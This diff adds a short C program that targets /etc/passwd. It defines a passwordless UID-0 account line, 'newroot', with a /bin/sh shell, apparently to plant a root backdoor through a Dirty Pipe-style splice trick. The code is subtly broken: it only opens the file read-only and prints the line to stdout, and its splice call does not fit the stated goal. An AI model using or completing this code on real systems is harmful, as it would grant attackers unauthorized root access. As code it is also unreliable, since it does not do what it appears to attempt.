@@ -1,0 +1,16 @@
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+#include <string.h>
+
+int main() {
+    char buf[] = "\nnewroot::0:0::/:/bin/sh";
+    struct stat st;
+    int fd = open("/etc/passwd", O_RDONLY);
+    fstat(fd, &st);
+
+    loff_t offset = st.st_size;
+    ssize_t written = splice(fd, &offset, 1, NULL, strlen(buf), SPLICE_F_MOVE);
+    write(1, buf, strlen(buf));
+    close(fd);
+}
